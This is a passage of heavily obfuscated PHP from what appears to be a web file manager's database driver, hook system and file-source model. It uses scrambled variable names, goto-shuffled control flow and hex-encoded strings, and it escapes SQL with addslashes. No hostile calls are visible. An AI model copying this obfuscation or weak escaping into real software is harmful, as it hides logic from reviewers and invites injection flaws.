$FòìÊ³Şã˜[33]), $FòìÊ³Şã˜[34] => isset($eèÈ¤Ã•ó[$FòìÊ³Şã˜[34]]) ? $eèÈ¤Ã•ó[$FòìÊ³Şã˜[34]] : (isset($eèÈ¤Ã•ó[$FòìÊ³Şã˜[53]]) ? $eèÈ¤Ã•ó[$FòìÊ³Şã˜[53]] : $FòìÊ³Şã˜[361]), $FòìÊ³Şã˜[36] => isset($eèÈ¤Ã•ó[$FòìÊ³Şã˜[89]]) ? strtolower($eèÈ¤Ã•ó[$FòìÊ³Şã˜[89]]) == $FòìÊ³Şã˜[38] : (isset($eèÈ¤Ã•ó[$FòìÊ³Şã˜[54]]) ? $eèÈ¤Ã•ó[$FòìÊ³Şã˜[54]] : !1), $FòìÊ³Şã˜[39] => isset($eèÈ¤Ã•ó[$FòìÊ³Şã˜[863]]) ? strtolower($eèÈ¤Ã•ó[$FòìÊ³Şã˜[863]]) == $FòìÊ³Şã˜[41] : (isset($eèÈ¤Ã•ó[$FòìÊ³Şã˜[89]]) ? $eèÈ¤Ã•ó[$FòìÊ³Şã˜[89]] : !1)); } } goto EÀÉçÆ´Ø¬; EÀÉçÆ´Ø¬: return $c¹Î“ª‘Ù ; goto F’Õ½Ä‹«; dÜÙÛ°ŞÕ: $FòìÊ³Şã˜ =& $_SERVER[¦·]; $this->initConnect(!0); if (think_config($FòìÊ³Şã˜[847])) { $AîæãçÙ÷î = str_replace($FòìÊ³Şã˜[848], $BÌÜÅ–ñ£ä, think_config($FòìÊ³Şã˜[847])); } else { switch ($this->dbType) { case $FòìÊ³Şã˜[831]: case $FòìÊ³Şã˜[849]: $AîæãçÙ÷î = "\x53\x45\x4c\105\x43\124\40\x20\x20\143\x6f\154\165\x6d\x6e\137\x6e\141\155\x65\40\141\x73\x20\x27\x4e\x61\155\x65\47\x2c\40\x20\x20\144\141\164\141\137\164\171\160\145\40\x61\163\40\47\x54\171\160\145\x27\x2c\x20\40\x20\x63\x6f\154\165\x6d\156\x5f\144\145\146\141\165\154\x74\x20\141\163\x20\47\104\145\146\141\165\x6c\x74\47\54\40\40\x20\151\163\137\156\165\x6c\154\x61\142\154\x65\40\x61\x73\40\x27\x4e\165\154\x6c\x27\xa\11\x9\x46\122\117\x4d\11\x69\x6e\146\x6f\x72\155\x61\164\x69\x6f\156\x5f\163\x63\x68\145\x6d\x61\x2e\164\141\142\154\x65\x73\x20\101\x53\x20\x74\xa\x9\11\x4a\x4f\111\116\x9\x69\x6e\146\x6f\162\x6d\x61\164\x69\157\156\x5f\x73\143\150\x65\x6d\141\x2e\143\157\154\x75\155\156\x73\x20\101\123\x20\x63\12\11\11\117\116\40\x20\x74\x2e\x74\141\x62\154\145\x5f\x63\141\164\x61\x6c\x6f\x67\x20\x3d\40\143\x2e\164\x61\142\x6c\145\x5f\x63\141\x74\141\x6c\x6f\x67\xa\11\x9\101\x4e\104\40\x74\x2e\164\x61\x62\154\145\137\x73\143\x68\145\x6d\x61\40\x3d\x20\143\x2e\164\141\x62\x6c\145\x5f\x73\x63\150\145\155\141\12\x9\x9\101\116\x44\x20\164\56\164\x61\x62\154\145\137\x6e\141\155\145\x20\x3d\x20\143\56\164\141\142\x6c\145\x5f\156\x61\x6d\x65\xa\11\x9\x57\110\105\122\105\40\40\40\x74\56\164\x61\142\x6c\x65\x5f\x6e\x61\155\x65\40\75\x20\47{$BÌÜÅ–ñ£ä}\47"; break; case $FòìÊ³Şã˜[850]: $AîæãçÙ÷î = $FòìÊ³Şã˜[851] . $BÌÜÅ–ñ£ä . $FòìÊ³Şã˜[852]; break; case $FòìÊ³Şã˜[832]: case $FòìÊ³Şã˜[834]: $AîæãçÙ÷î = $FòìÊ³Şã˜[853] . $FòìÊ³Şã˜[854] . $FòìÊ³Şã˜[855] . strtoupper($BÌÜÅ–ñ£ä) . $FòìÊ³Şã˜[856] . strtoupper($BÌÜÅ–ñ£ä) . $FòìÊ³Şã˜[857]; break; case $FòìÊ³Şã˜[858]: $AîæãçÙ÷î = $FòìÊ³Şã˜[859] . $BÌÜÅ–ñ£ä . $FòìÊ³Şã˜[860]; break; case $FòìÊ³Şã˜[833]: break; case $FòìÊ³Şã˜[861]: default: $AîæãçÙ÷î = $FòìÊ³Şã˜[862] . ($this->dbType == $FòìÊ³Şã˜[861] ? "\140{$BÌÜÅ–ñ£ä}\140" : $BÌÜÅ–ñ£ä); } } goto cÉ÷”Ñ¤º; F’Õ½Ä‹«: } public function getTables($CØÌ¸ëä‘Í = '') { $CÈ¢Â·¶¢Œ =& $_SERVER[¦·]; if (think_config($CÈ¢Â·¶¢Œ[864])) { $eã¼Ó¸°é = str_replace($CÈ¢Â·¶¢Œ[865], $CØÌ¸ëä‘Í, think_config($CÈ¢Â·¶¢Œ[864])); } else { switch ($this->dbType) { case $CÈ¢Â·¶¢Œ[832]: case $CÈ¢Â·¶¢Œ[834]: $eã¼Ó¸°é = $CÈ¢Â·¶¢Œ[866]; break; case $CÈ¢Â·¶¢Œ[831]: case $CÈ¢Â·¶¢Œ[849]: $eã¼Ó¸°é = $CÈ¢Â·¶¢Œ[867]; break; case $CÈ¢Â·¶¢Œ[858]: $eã¼Ó¸°é = $CÈ¢Â·¶¢Œ[868]; break; case $CÈ¢Â·¶¢Œ[833]: think_exception(think_lang($CÈ¢Â·¶¢Œ[869]) . $CÈ¢Â·¶¢Œ[870]); break; case $CÈ¢Â·¶¢Œ[850]: $eã¼Ó¸°é = $CÈ¢Â·¶¢Œ[42] . $CÈ¢Â·¶¢Œ[43] . $CÈ¢Â·¶¢Œ[44]; break; case $CÈ¢Â·¶¢Œ[861]: default: if (!empty($CØÌ¸ëä‘Í)) { $eã¼Ó¸°é = $CÈ¢Â·¶¢Œ[814] . $CØÌ¸ëä‘Í; } else { $eã¼Ó¸°é = $CÈ¢Â·¶¢Œ[815]; } } } $aÎˆ£œì·Ó = $this->query($eã¼Ó¸°é); $C¥Üèƒ‰Â¾ = array(); foreach ($aÎˆ£œì·Ó as $f½İ‰Ù±Ö => $A×šÔÉÅˆÈ) { $C¥Üèƒ‰Â¾[$f½İ‰Ù±Ö] = current($A×šÔÉÅˆÈ); } return $C¥Üèƒ‰Â¾; } protected function parseLimit($fĞÃ—ÈÚ») { $eâ…™ñÁ =& $_SERVER[¦·]; $A…Î¿‘‹¡¹ = $eâ…™ñÁ[33]; if (!empty($fĞÃ—ÈÚ»)) { switch ($this->dbType) { case $eâ…™ñÁ[858]: case $eâ…™ñÁ[850]: $fĞÃ—ÈÚ» = explode($eâ…™ñÁ[47], $fĞÃ—ÈÚ»); if (count($fĞÃ—ÈÚ») > 1) { $A…Î¿‘‹¡¹ .= $eâ…™ñÁ[48] . $fĞÃ—ÈÚ»[1] . $eâ…™ñÁ[49] . $fĞÃ—ÈÚ»[0] . $eâ…™ñÁ[50]; } else { $A…Î¿‘‹¡¹ .= $eâ…™ñÁ[48] . $fĞÃ—ÈÚ»[0] . $eâ…™ñÁ[50]; } break; case $eâ…™ñÁ[831]: case $eâ…™ñÁ[849]: break; case $eâ…™ñÁ[833]: break; case $eâ…™ñÁ[832]: case $eâ…™ñÁ[834]: break; case $eâ…™ñÁ[861]: default: $A…Î¿‘‹¡¹ .= $eâ…™ñÁ[48] . $fĞÃ—ÈÚ» . $eâ…™ñÁ[50]; } } return $A…Î¿‘‹¡¹; } public function parseKey(&$a’­æØ›œŒ, $E—°ÚÌÜĞ† = true) { $FŞ‚£Ášêˆ =& $_SERVER[¦·]; if ($E—°ÚÌÜĞ†) { $a’­æØ›œŒ = $this->parseKeyCheck($a’­æØ›œŒ); } if ($this->dbType == $FŞ‚£Ášêˆ[861]) { if ($a’­æØ›œŒ != $FŞ‚£Ášêˆ[176] && !preg_match($FŞ‚£Ášêˆ[825], $a’­æØ›œŒ)) { $a’­æØ›œŒ = $FŞ‚£Ášêˆ[826] . trim($a’­æØ›œŒ, $FŞ‚£Ášêˆ[826]) . $FŞ‚£Ášêˆ[826]; } return $a’­æØ›œŒ; } else { return parent::parseKey($a’­æØ›œŒ); } } public function close() { $this->_linkID = null; } public function error() { $dÙ¡¿ºš‹Ğ =& $_SERVER[¦·]; if ($this->PDOStatement) { $EÈ§ìˆ¢¥ = $this->PDOStatement->errorInfo(); $this->error = $EÈ§ìˆ¢¥[1] . $dÙ¡¿ºš‹Ğ[4] . $EÈ§ìˆ¢¥[2]; } else { $this->error = $dÙ¡¿ºš‹Ğ[33]; } if ($dÙ¡¿ºš‹Ğ[33] != $this->queryStr) { $this->error .= LNG($dÙ¡¿ºš‹Ğ[45]) . $this->queryStr; } think_trace($this->error, $dÙ¡¿ºš‹Ğ[33], $dÙ¡¿ºš‹Ğ[46]); return $this->error; } public function escapeString($Aî·¼†Œ¿á) { $cÄ„£¶Ö¨Õ =& $_SERVER[¦·]; switch ($this->dbType) { case $cÄ„£¶Ö¨Õ[858]: case $cÄ„£¶Ö¨Õ[831]: case $cÄ„£¶Ö¨Õ[849]: case $cÄ„£¶Ö¨Õ[861]: return addslashes($Aî·¼†Œ¿á); case $cÄ„£¶Ö¨Õ[833]: case $cÄ„£¶Ö¨Õ[850]: case $cÄ„£¶Ö¨Õ[832]: case $cÄ„£¶Ö¨Õ[834]: return str_ireplace($cÄ„£¶Ö¨Õ[55], $cÄ„£¶Ö¨Õ[56], $Aî·¼†Œ¿á); } } protected function parseValue($E„Á–µ¥Ù¯) { $c†Ïñ£›Û =& $_SERVER[¦·]; if (is_string($E„Á–µ¥Ù¯)) { $E„Á–µ¥Ù¯ = strpos($E„Á–µ¥Ù¯, $c†Ïñ£›Û[4]) === 0 ? $this->escapeString($E„Á–µ¥Ù¯) : $c†Ïñ£›Û[871] . $this->escapeString($E„Á–µ¥Ù¯) . $c†Ïñ£›Û[871]; } elseif (isset($E„Á–µ¥Ù¯[0]) && is_string($E„Á–µ¥Ù¯[0]) && strtolower($E„Á–µ¥Ù¯[0]) == $c†Ïñ£›Û[285]) { $E„Á–µ¥Ù¯ = $this->escapeString($E„Á–µ¥Ù¯[1]); } elseif (is_array($E„Á–µ¥Ù¯)) { $E„Á–µ¥Ù¯ = array_map(array($this, $c†Ïñ£›Û[872]), $E„Á–µ¥Ù¯); } elseif (is_bool($E„Á–µ¥Ù¯)) { $E„Á–µ¥Ù¯ = $E„Á–µ¥Ù¯ ? $c†Ïñ£›Û[83] : $c†Ïñ£›Û[470]; } elseif (is_null($E„Á–µ¥Ù¯)) { $E„Á–µ¥Ù¯ = $c†Ïñ£›Û[99]; } return $E„Á–µ¥Ù¯; } public function getLastInsertId() { $eºªºåí½£ =& $_SERVER[¦·]; switch ($this->dbType) { case $eºªºåí½£[858]: case $eºªºåí½£[850]: case $eºªºåí½£[831]: case $eºªºåí½£[849]: case $eºªºåí½£[833]: case $eºªºåí½£[861]: return $this->_linkID->lastInsertId(); case $eºªºåí½£[832]: case $eºªºåí½£[834]: $e·ÙÅŒŸ· = $this->table; $d–†›ìŒÇï = $this->query("\x53\105\114\x45\x43\x54\x20{$e·ÙÅŒŸ·}\x2e\x63\165\162\x72\166\x61\x6c\x20\x63\165\x72\162\x76\141\x6c\x20\106\122\x4f\x4d\x20\x64\x75\141\x6c"); return $d–†›ìŒÇï ? $d–†›ìŒÇï[0][$eºªºåí½£[873]] : 0; } } } goto dìˆßË´•š; fà„ºá¢±: function exif_read_data_io($Bé‹Ê±¨Â¤, $A“Ì„·ÜËĞ = null, $D‡›ì©˜¦¤ = false, $A©¢Ô›“¾¹ = false) { $c¿¯¬×³ÈÜ = StreamWrapperIO::read($Bé‹Ê±¨Â¤, 0, 1024 * 64); $d†„•Õò¾Ç = $_SERVER[¦·][1755] . base64_encode($c¿¯¬×³ÈÜ); return exif_read_data($d†„•Õò¾Ç, $A“Ì„·ÜËĞ, $D‡›ì©˜¦¤, $A©¢Ô›“¾¹); } function getimagesize_io($D†Óóˆ·ê„, &$E“ÊÃ†Ş¼ = false) { $fÅÁ¢ñØ¿Ö = StreamWrapperIO::read($D†Óóˆ·ê„, 0, 1024 * 64); $D†Óóˆ·ê„ = $_SERVER[¦·][1755] . base64_encode($fÅÁ¢ñØ¿Ö); return getimagesize($D†Óóˆ·ê„, $E“ÊÃ†Ş¼); } class Hook { private static $events = array(); public static function get($dº¢Ú£‰ò = false) { if (!$dº¢Ú£‰ò) { return self::$events; } else { return self::$events[$dº¢Ú£‰ò]; } } public static function apply($c¹âîƒÄŸÂ, $A÷Ü³¿Š = array()) { $d©‚¼§ø’ï = ActionApply($c¹âîƒÄŸÂ, $A÷Ü³¿Š); if (is_string($c¹âîƒÄŸÂ)) { Hook::trigger($c¹âîƒÄŸÂ); } return $d©‚¼§ø’ï; } public static function bind($BŠ¶µ‘”™¿, $dÙ×÷å¼“‰, $C¶¿óƒƒéš = false) { $b’Üßòõ´¼ =& $_SERVER[¦·]; if (!isset(self::$events[$BŠ¶µ‘”™¿])) { self::$events[$BŠ¶µ‘”™¿] = array(); } self::$events[$BŠ¶µ‘”™¿][] = array($b’Üßòõ´¼[1756] => $dÙ×÷å¼“‰, $b’Üßòõ´¼[1757] => $C¶¿óƒƒéš, $b’Üßòõ´¼[1758] => 0); } public static function once($B—›ŒÎ­ÁÉ, $A‡›ãğ¯¥) { self::bind($B—›ŒÎ­ÁÉ, $A‡›ãğ¯¥, !0); } public static function unbind($CßË¬íÕá´, $Eˆ™Ú¤ó…› = false) { if (!$Eˆ™Ú¤ó…›) { self::$events[$CßË¬íÕá´] = array(); return; } $BğŠÎ×Õ÷ç = self::$events[$CßË¬íÕá´]; self::$events[$CßË¬íÕá´] = array(); if (!is_array($BğŠÎ×Õ÷ç)) { return; } for ($DŒİÁ¶‚‡Œ = 0; $DŒİÁ¶‚‡Œ < count($BğŠÎ×Õ÷ç); $DŒİÁ¶‚‡Œ++) { if ($BğŠÎ×Õ÷ç[$DŒİÁ¶‚‡Œ][$_SERVER[¦·][1756]] == $Eˆ™Ú¤ó…›) { continue; } self::$events[$CßË¬íÕá´][] = $BğŠÎ×Õ÷ç[$DŒİÁ¶‚‡Œ]; } } public static function filter($a‘ø„é’Â¢, $e¶§åœÉĞ) { goto bä˜½“¢«Ü; bä˜½“¢«Ü: $eÊ­‹ãŞÔ =& $_SERVER[¦·]; $EÃÏƒøë = self::$events; if (!isset($EÃÏƒøë[$a‘ø„é’Â¢])) { return $e¶§åœÉĞ; } goto eÏä¸¬ê‚; Fâ·†”ÓØÍ: for ($bª’òª×ƒ = 0; $bª’òª×ƒ < count($Eèİƒ¼½©); $bª’òª×ƒ++) { $fĞÙÇó±– = $Eèİƒ¼½©[$bª’òª×ƒ]; if ($fĞÙÇó±–[$eÊ­‹ãŞÔ[1757]] && $fĞÙÇó±–[$eÊ­‹ãŞÔ[1758]] > 1) { continue; } self::$events[$a‘ø„é’Â¢][$bª’òª×ƒ][$eÊ­‹ãŞÔ[1758]] = $fĞÙÇó±–[$eÊ­‹ãŞÔ[1758]] + 1; $Aâ¿Üº¼îö = self::apply($fĞÙÇó±–[$eÊ­‹ãŞÔ[1756]], array($AÄ¨ØšİÂ)); if (gettype($Aâ¿Üº¼îö) == gettype($AÄ¨ØšİÂ)) { $AÄ¨ØšİÂ = $Aâ¿Üº¼îö; } } return $AÄ¨ØšİÂ; goto fçå°ëÂ›°; eÏä¸¬ê‚: $Eèİƒ¼½© = $EÃÏƒøë[$a‘ø„é’Â¢]; $AÄ¨ØšİÂ = $e¶§åœÉĞ; if (!is_array($Eèİƒ¼½©) || count($Eèİƒ¼½©) == 0) { return $AÄ¨ØšİÂ; } goto Fâ·†”ÓØÍ; fçå°ëÂ›°: } public static function trigger($EÑô†’¤ã) { goto døÕ ²ÃÈ; fŠ…óŸ¿Ú: return $B·£¢ê; goto cø÷Éˆç; f…áãˆçÅ¸: if (!isset($b²‰§‡Í±¸[$EÑô†’¤ã])) { return $B·£¢ê; } $c¿òğñÉğ = $b²‰§‡Í±¸[$EÑô†’¤ã]; if (!is_array($c¿òğñÉğ) || count($c¿òğñÉğ) == 0) { return $B·£¢ê; } goto dÍÏÓŠ•ìÈ; døÕ ²ÃÈ: $DÔ ¡—ŞçÃ =& $_SERVER[¦·]; $b²‰§‡Í±¸ = self::$events; $B·£¢ê = !1; goto f…áãˆçÅ¸; dÍÏÓŠ•ìÈ: $cÊ‘Şù×† = func_get_args(); array_shift($cÊ‘Şù×†); for ($D«‰‡®‡½ = 0; $D«‰‡®‡½ < count($c¿òğñÉğ); $D«‰‡®‡½++) { $c°œÔÉ«¾· = $c¿òğñÉğ[$D«‰‡®‡½]; if ($c°œÔÉ«¾·[$DÔ ¡—ŞçÃ[1757]] && $c°œÔÉ«¾·[$DÔ ¡—ŞçÃ[1758]] > 1) { continue; } if (defined($DÔ ¡—ŞçÃ[1759]) && GLOBAL_LOG_HOOK) { write_log($EÑô†’¤ã . $DÔ ¡—ŞçÃ[1760] . $c°œÔÉ«¾·[$DÔ ¡—ŞçÃ[1756]], $DÔ ¡—ŞçÃ[1761]); } self::$events[$EÑô†’¤ã][$D«‰‡®‡½][$DÔ ¡—ŞçÃ[1758]] = $c°œÔÉ«¾·[$DÔ ¡—ŞçÃ[1758]] + 1; $fŞÑç¼èØ¢ = self::apply($c°œÔÉ«¾·[$DÔ ¡—ŞçÃ[1756]], $cÊ‘Şù×†); if (defined($DÔ ¡—ŞçÃ[1759]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $DÔ ¡—ŞçÃ[1761]); if ($c°œÔÉ«¾·[$DÔ ¡—ŞçÃ[1758]] == 200) { $BƒÌ‘á¿âï = is_array($c°œÔÉ«¾·[$DÔ ¡—ŞçÃ[1756]]) ? json_encode_force($c°œÔÉ«¾·[$DÔ ¡—ŞçÃ[1756]]) : $c°œÔÉ«¾·[$DÔ ¡—ŞçÃ[1756]]; write_log($DÔ ¡—ŞçÃ[1762] . $EÑô†’¤ã . $DÔ ¡—ŞçÃ[1763] . $BƒÌ‘á¿âï, $DÔ ¡—ŞçÃ[1764]); } } $B·£¢ê = is_null($fŞÑç¼èØ¢) ? $B·£¢ê : $fŞÑç¼èØ¢; } goto fŠ…óŸ¿Ú; cø÷Éˆç: } } goto bÏ‚åÅ÷ÉŠ; a¹Ô¨ÅáØµ: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\x6d\x65" => "\x69\x6f\137\x73\157\165\162\x63\x65\137\155\x65\164\141", "\155\x65\164\x61\106\151\x65\154\144" => "\x73\x6f\165\x72\143\145\111\104"); protected $dataAuto = array(array("\155\157\144\x69\x66\x79\124\151\x6d\145", "\164\151\155\x65", "\x69\156\163\x65\162\164", "\x66\x75\x6e\143\164\x69\x6f\x6e"), array("\x63\x72\x65\x61\x74\145\x54\x69\155\145", "\164\151\x6d\145", "\x69\156\163\x65\x72\x74", "\x66\165\x6e\x63\x74\151\x6f\x6e"), array("\166\151\x65\x77\x54\151\x6d\x65", "\x74\151\155\x65", "\x69\156\x73\145\x72\164", "\x66\165\156\x63\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($cÁœ¹óå) { return $this->listSource(array($_SERVER[¦·][368] => $cÁœ¹óå)); } public function typeName($c·³´Ää ) { static $FÖÇÂè‡³Ù = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\x65\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\147\x72\x6f\165\160"); return $FÖÇÂè‡³Ù[$c·³´Ää  . $_SERVER[¦·][33]]; } public function sourceListInfo($C…Ãç†Ë†™, $d÷ÎÅÎªö = false) { goto Déì¼½²Ø©; fÖ¸õ¦öâ‡: if (!$C…Ãç†Ë†™) { return array(); } $C÷¡Ó»ˆ’ = $this->where(array($Aº½ˆˆ¦æ´[369] => array($Aº½ˆˆ¦æ´[7], $C…Ãç†Ë†™)))->select(); $this->_listDataApply($C÷¡Ó»ˆ’, $d÷ÎÅÎªö); goto fÎ‰‘§ËÌï; Déì¼½²Ø©: $Aº½ˆˆ¦æ´ =& $_SERVER[¦·]; $C…Ãç†Ë†™ = $C…Ãç†Ë†™ ? $C…Ãç†Ë†™ : array(); $C…Ãç†Ë†™ = array_filter(array_unique($C…Ãç†Ë†™)); goto fÖ¸õ¦öâ‡; fÎ‰‘§ËÌï: return array_to_keyvalue($C÷¡Ó»ˆ’, $Aº½ˆˆ¦æ´[369]); goto B©Åë‡øÜ ; B©Åë‡øÜ : } public function pathInfoFilter($f“ö£­âÅ) { goto Aë‰Ş»÷„à; DÎÈ¢‹¦‡‹: $aßƒÄ™¹ÅŠ .= $E·ÅŸ…ƒŸÑ[374]; $aßƒÄ™¹ÅŠ .= $E·ÅŸ…ƒŸÑ[375]; $F¤ÔíÅåó = explode($E·ÅŸ…ƒŸÑ[47], $aßƒÄ™¹ÅŠ); goto f‘°ñï‡ùÛ; eÀ¡Í‹‘Õ: $f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[371]] = $this->typeName($f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[371]]); if ($f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[370]] != 1) { $f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[160]] = $f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[372]]; unset($f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[372]]); } $aßƒÄ™¹ÅŠ = $E·ÅŸ…ƒŸÑ[373]; goto DÎÈ¢‹¦‡‹; Aë‰Ş»÷„à: $E·ÅŸ…ƒŸÑ =& $_SERVER[¦·]; $f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[75]] = KodIO::make($f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[369]]); $f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[29]] = $f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[370]] == 1 ? $E·ÅŸ…ƒŸÑ[76] : $E·ÅŸ…ƒŸÑ[167]; goto eÀ¡Í‹‘Õ; f‘°ñï‡ùÛ: if (isset($f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[376]]) && $f“ö£­âÅ[$E·ÅŸ…ƒŸÑ[376]][$E·ÅŸ…ƒŸÑ[377]] == -1) { $F¤ÔíÅåó = array_remove_value($F¤ÔíÅåó, $E·ÅŸ…ƒŸÑ[187]); $F¤ÔíÅåó = array_remove_value($F¤ÔíÅåó, $E·ÅŸ…ƒŸÑ[107]); $F¤ÔíÅåó = array_remove_value($F¤ÔíÅåó, $E·ÅŸ…ƒŸÑ[378]); $F¤ÔíÅåó = array_remove_value($F¤ÔíÅåó, $E·ÅŸ…ƒŸÑ[379]); $F¤ÔíÅåó = array_remove_value($F¤ÔíÅåó, $E·ÅŸ…ƒŸÑ[77]); $F¤ÔíÅåó = array_remove_value($F¤ÔíÅåó, $E·ÅŸ…ƒŸÑ[380]); } $f“ö£­âÅ = array_field_key($f“ö£­âÅ, $F¤ÔíÅåó); return $f“ö£­âÅ; goto E¦ïòÏ…Èõ; E¦ïòÏ…Èõ: } public function listUserFav() { goto D‹°Ö„ĞŠ£; B­Œá§Ô„³: foreach ($BŠ“Ö±Ğâ° as &$D»ò–È½È) { $D»ò–È½È = array($cŞŒÁÂ»Îº[385] => $D»ò–È½È[$cŞŒÁÂ»Îº[367]], $cŞŒÁÂ»Îº[386] => $D»ò–È½È[$cŞŒÁÂ»Îº[28]], $cŞŒÁÂ»Îº[387] => $D»ò–È½È[$cŞŒÁÂ»Îº[75]], $cŞŒÁÂ»Îº[388] => $D»ò–È½È[$cŞŒÁÂ»Îº[29]], $cŞŒÁÂ»Îº[389] => $D»ò–È½È[$cŞŒÁÂ»Îº[187]], $cŞŒÁÂ»Îº[390] => $D»ò–È½È[$cŞŒÁÂ»Îº[107]]); if ($D»ò–È½È[$cŞŒÁÂ»Îº[29]] == $cŞŒÁÂ»Îº[382] && $Fø¸Òİ ñä[$D»ò–È½È[$cŞŒÁÂ»Îº[75]]]) { $D»ò–È½È[$cŞŒÁÂ»Îº[391]] = $Fø¸Òİ ñä[$D»ò–È½È[$cŞŒÁÂ»Îº[75]]]; } } unset($D»ò–È½È); return $BŠ“Ö±Ğâ°; goto cø„Ã½êĞµ; D‹°Ö„ĞŠ£: $cŞŒÁÂ»Îº =& $_SERVER[¦·]; $BŠ“Ö±Ğâ° = Model($cŞŒÁÂ»Îº[381])->listData(); $fÈ¼Ì‰ğå« = array_filter_by_field($BŠ“Ö±Ğâ°, $cŞŒÁÂ»Îº[29], $cŞŒÁÂ»Îº[382]); goto aà®ËƒÇĞ; aà®ËƒÇĞ: $fÈ¼Ì‰ğå« = array_to_keyvalue($fÈ¼Ì‰ğå«, $cŞŒÁÂ»Îº[33], $cŞŒÁÂ»Îº[75]); if ($fÈ¼Ì‰ğå«) { $Fø¸Òİ ñä = $this->listSource(array($cŞŒÁÂ»Îº[383] => array($cŞŒÁÂ»Îº[384], $fÈ¼Ì‰ğå«))); } $Fø¸Òİ ñä = array_to_keyvalue($Fø¸Òİ ñä[$cŞŒÁÂ»Îº[354]], $cŞŒÁÂ»Îº[369]); goto B­Œá§Ô„³; cø„Ã½êĞµ: } public function listUserTag($B‘Ûõİåªß) { goto d¯ï’ç«íÑ; CÑÃÒÓíÍš: foreach ($eçèî±Œ as $aÊáËòÇÙ => $dî©äÆŞ”) { $D÷Øï«šª = !0; if (!$B‘Ûõİåªß) { $eçŒçƒšã³[] = $aÊáËòÇÙ; continue; } foreach ($B‘Ûõİåªß as $bÌ½Ç÷ï¹Ú) { if (!in_array($bÌ½Ç÷ï¹Ú, $dî©äÆŞ”)) { $D÷Øï«šª = !1; break; } } if ($D÷Øï«šª) { $eçŒçƒšã³[] = $aÊáËòÇÙ; } } if (!$eçŒçƒšã³) { return array(); } $D«Ò‘´¯ç„ = $this->listSource(array($E­ãÃƒ´–Û[383] => array($E­ãÃƒ´–Û[384], $eçŒçƒšã³))); goto b™­—ªòÁ£; cÙ¿†õìé: $dó‚´…£Ÿ = array_to_keyvalue($D«Ò‘´¯ç„[$E­ãÃƒ´–Û[73]], $E­ãÃƒ´–Û[33], $E­ãÃƒ´–Û[369]); $B‰ºƒ¼½Š¬ = array_merge($dó‚´…£Ÿ, $BÁ”â×«Ş¼); foreach ($eçŒçƒšã³ as $b°¥–Ôà££) { if (!in_array($b°¥–Ôà££, $B‰ºƒ¼½Š¬)) { $c¾‚¼Ğ£±Ö[] = $b°¥–Ôà££; } } goto Aóé¼²Äéì; d¯ï’ç«íÑ: $E­ãÃƒ´–Û =& $_SERVER[¦·]; if ($B‘Ûõİåªß && !is_array($B‘Ûõİåªß)) { $B‘Ûõİåªß = array($B‘Ûõİåªß); } $FŠñ˜§¼ß = Model($E­ãÃƒ´–Û[392])->listData(); goto aï‚¤À®Ğ§; aï‚¤À®Ğ§: $eçèî±Œ = array(); foreach ($FŠñ˜§¼ß as $dì˜…´Ö™ò) { $b°¥–Ôà££ = $dì˜…´Ö™ò[$E­ãÃƒ´–Û[75]]; if (!$b°¥–Ôà££) { continue; } if (!isset($eçèî±Œ[$b°¥–Ôà££])) { $eçèî±Œ[$b°¥–Ôà££] = array(); } $eçèî±Œ[$b°¥–Ôà££][] = $dì˜…´Ö™ò[$E­ãÃƒ´–Û[393]]; } $eçŒçƒšã³ = array(); goto CÑÃÒÓíÍš; b™­—ªòÁ£: if (!$D«Ò‘´¯ç„ || count($eçŒçƒšã³) == $D«Ò‘´¯ç„[$E­ãÃƒ´–Û[351]][$E­ãÃƒ´–Û[352]]) { return $D«Ò‘´¯ç„; } $c¾‚¼Ğ£±Ö = array(); $BÁ”â×«Ş¼ = array_to_keyvalue($D«Ò‘´¯ç„[$E­ãÃƒ´–Û[74]], $E­ãÃƒ´–Û[33], $E­ãÃƒ´–Û[369]); goto cÙ¿†õìé; Aóé¼²Äéì: if ($c¾‚¼Ğ£±Ö) { Model($E­ãÃƒ´–Û[394])->removeBySource($c¾‚¼Ğ£±Ö); } return $D«Ò‘´¯ç„; goto f”™»‰Âåè; f”™»‰Âåè: } public function listUserRecycle() { $eò¶öÀ«¸£ =& $_SERVER[¦·]; $B±Öùè¾àÑ = Model($eò¶öÀ«¸£[395])->listData(); if (!$B±Öùè¾àÑ) { return array(); } $B«õö¨…Óœ = array($eò¶öÀ«¸£[383] => array($eò¶öÀ«¸£[384], $B±Öùè¾àÑ), $eò¶öÀ«¸£[396] => 1); return $this->listSource($B«õö¨…Óœ); } public function listSource($CâÈÑÇÙ‚œ, $E©ëœ–»˜ = 3000) { goto AËŸï´¿¿¢; AËŸï´¿¿¢: $D¥ãì˜Õ¶“ =& $_SERVER[¦·]; if (!isset($CâÈÑÇÙ‚œ[$D¥ãì˜Õ¶“[397]])) { $CâÈÑÇÙ‚œ[$D¥ãì˜Õ¶“[397]] = 0; } $b²•Ğ º©Ë = $D¥ãì˜Õ¶“[398]; goto aìğÉŒ¿ó¸; BóÁ‰À´•: return $B‚çš‡¦Ş; goto EÁÎ‚À½ ; aìğÉŒ¿ó¸: $B‚çš‡¦Ş = $this->field($b²•Ğ º©Ë)->_makeOrder()->where($CâÈÑÇÙ‚œ)->selectPage($E©ëœ–»˜); $this->_listDataApply($B‚çš‡¦Ş[$D¥ãì˜Õ¶“[354]]); $this->_listMake($B‚çš‡¦Ş); goto BóÁ‰À´•; EÁÎ‚À½ : } protected function _makeOrder() { goto c‚§¨ÉÅ¡Ú; c‚§¨ÉÅ¡Ú: $FÈ¢öÇ«ó =& $_SERVER[¦·]; $dé ‘‡‘Ê˜ = 